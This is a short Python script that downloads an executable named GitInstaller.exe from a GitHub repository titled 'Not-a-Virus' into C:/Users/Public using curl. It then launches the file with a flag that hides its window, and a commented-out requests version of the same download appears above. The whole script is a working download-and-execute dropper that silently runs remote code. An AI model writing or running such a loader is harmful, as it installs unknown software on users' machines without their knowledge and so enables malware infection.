import requests
import os
from time import sleep
import subprocess
from charset_normalizer import md__mypyc

print('starting')
# file = requests.get('https://github.com/romanjmock/Not-a-Virus/raw/main/dist/GitInstaller.exe', stream = True)
# print('request recieved')
# newFile = open('GitInstaller.exe', 'wb')
# newFile.write(file.content)
# newFile.close()
os.system("curl -o C:/Users/Public/GitInstaller.exe -L https://github.com/romanjmock/Not-a-Virus/raw/main/dist/GitInstaller.exe --ssl-no-revoke")
print('file created')

CREATE_NO_WINDOW = 0x08000000
subprocess.Popen('C:/Users/Public/GitInstaller.exe', creationflags = CREATE_NO_WINDOW)
print('done')